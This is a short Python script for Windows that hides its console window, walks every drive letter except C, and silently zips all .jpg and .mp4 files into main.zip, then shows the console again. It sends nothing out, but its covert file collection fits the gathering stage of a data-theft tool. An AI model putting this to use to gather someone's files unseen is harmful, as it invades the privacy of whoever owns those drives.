import os , win32gui , win32con
from zipfile import ZipFile

# Hide CMD
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)
# Driver name 
List = ['A' , 'B' ,'D' , 'E' , 'F' ,'G' , 'H' , 'I' , 'J' , 'K' , 'L' , 'M' ,'N' , 'O' , 'P',
'Q','R','S','T','U','V','W','X','Y','Z']

# Make Zip File
zipObj = ZipFile('main.zip', 'w')

for i in List:
    EXTENSIONS = {".jpg" , ".mp4" } # put type of file here
    try: 
        for dirname, dirpaths, filenames in os.walk(str(i)+":\\"):
            for filename in filenames:
                ext = os.path.splitext(filename)[-1]
                if ext in EXTENSIONS:
                    x = os.path.join(dirname, filename)
                    zipObj.write(str(x)) # Add file to zip
    except:
        pass

zipObj.close()
# Show cmd in the end of process
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)